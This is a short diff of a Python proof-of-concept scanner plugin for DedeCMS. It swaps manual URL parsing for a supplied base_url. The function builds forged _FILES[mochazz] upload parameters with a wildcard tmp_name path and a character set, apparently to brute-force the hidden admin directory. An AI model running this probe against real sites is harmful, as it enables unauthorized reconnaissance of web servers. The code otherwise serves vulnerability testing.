@@ -22,7 +22,7 @@ def get_script_info(data=None):
 
 def prove(data):
     data = init(data, 'web')
-    if data['url']:
+    if data['base_url']:
         characters = "abcdefghijklmnopqrstuvwxyz0123456789_!#"
         _data = {
             "_FILES[mochazz][tmp_name]": "./{p}<</images/adminico.gif",
@@ -30,13 +30,8 @@ def prove(data):
             "_FILES[mochazz][size]": 0,
             "_FILES[mochazz][type]": "image/gif"
         }
-        protocol, s1 = urllib.parse.splittype(data['url'])
-        host, s2 = urllib.parse.splithost(s1)
-        host, port = urllib.parse.splitport(host)
-        port = data['target_port'] if port != None else 443 if protocol == 'https' else 80
-        base_url = protocol + "://" + host + ":" + str(port) + '/'
         for a in ['', 'dedecms/']:
-            myurl = base_url + a
+            myurl = data['base_url'] + a
             back_dir = ""
             flag = 0
             try:
